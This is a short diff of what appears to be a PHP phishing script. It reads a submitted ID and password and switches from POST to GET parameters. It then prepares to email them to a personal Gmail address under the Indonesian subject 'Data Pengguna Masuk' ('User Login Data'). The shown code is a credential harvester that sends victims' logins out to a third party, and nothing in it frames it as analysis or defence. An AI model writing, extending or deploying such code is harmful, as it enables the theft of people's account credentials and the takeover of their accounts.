@@ -1,8 +1,8 @@
 
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $id = $_POST["id"];
-    $password = $_POST["password"];
+if ($_SERVER["REQUEST_METHOD"] == "GET") {
+    $id = $_GET["id"];
+    $password = $_GET["password"];
 
     $to = "imoell10101988@gmail.com";
     $subject = "Data Pengguna Masuk";
